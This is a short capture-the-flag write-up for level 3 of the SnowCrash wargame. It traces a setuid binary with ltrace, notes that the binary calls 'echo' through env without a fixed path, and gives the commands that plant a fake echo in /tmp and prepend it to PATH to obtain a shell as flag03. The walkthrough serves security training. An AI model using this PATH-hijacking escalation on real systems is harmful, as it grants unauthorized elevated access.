# Level03

We have a file with the `setuid` which means that the binary is executed as its owner so in this case `flag03`.
```shell
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff6f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                             = 2003
geteuid()                                                                             = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                   = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                   = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                = 0
+++ exited (status 0) +++
```
We see that the binary runs `echo` from the system without giving a path and the `env` is given to the binary.
This means that we can overwrite the env variable `PATH` to add a path with a custom `echo` which will give us a shell.

```shell
echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo
export PATH="/tmp:$PATH"
```

Then once you run `./level03`, a flag03 shell pops